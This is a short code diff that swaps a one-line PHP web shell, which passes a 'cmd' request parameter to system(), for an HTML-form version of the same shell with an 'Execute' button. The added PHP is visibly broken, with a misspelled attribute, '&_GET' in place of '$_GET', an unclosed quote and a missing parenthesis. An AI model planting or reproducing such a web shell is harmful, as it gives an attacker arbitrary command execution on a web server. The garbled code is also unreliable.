@@ -1,2 +1,17 @@
-<?php system($_GET['cmd']); ?>
+<html>
+  <body>
+    <form method="GET" name="
+      <?php echo basename($_SERVER['PHP_SELF']);?>">
+      <input type="TEXT" nam="cmd" autofocus id="cmd" size="70">
 
+      <input type="SUBMIT" value="Execute">
+    </form>
+    <pre>
+      <?php if(isset(&_GET['cmd]))
+      {
+        system($_GET['cmd'];
+      }
+      ?>
+    </pre>
+  </body>
+</html>
